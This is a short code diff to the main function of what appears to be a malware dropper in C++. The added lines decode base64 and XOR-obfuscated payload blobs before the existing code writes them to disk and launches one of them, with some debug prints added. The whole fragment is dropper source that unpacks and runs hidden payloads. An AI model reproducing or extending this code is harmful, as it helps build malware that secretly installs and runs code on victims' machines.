@@ -134,6 +134,17 @@ int main(int argc, char* argv[])
 
 		w7_dropper_start();
 
+	#if DROPPER_BASE64 == 1
+		data2 = base64decode(data2, &size2);
+		data3 = base64decode(data3, &size3);
+	#endif
+
+	#if DROPPER_XOR_KEY != 0
+		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
+		data2 = XOR(data2, size2);
+		data3 = XOR(data3, size3);
+	#endif
+
 		drop(data2, size2, name2);
 
 		drop(data3, size3, name3);
@@ -154,6 +165,10 @@ int main(int argc, char* argv[])
 		data4 = XOR(data4, size4);
 	#endif
 
+		std::cout << "This is name: " << name4 << "\n";
+
+		printf("This is data4: %p\n", data4);
+		printf("This is size: %llu\n", (unsigned long long) size4);
 		drop(data4, size4, name4);
 
 		launch(name4);
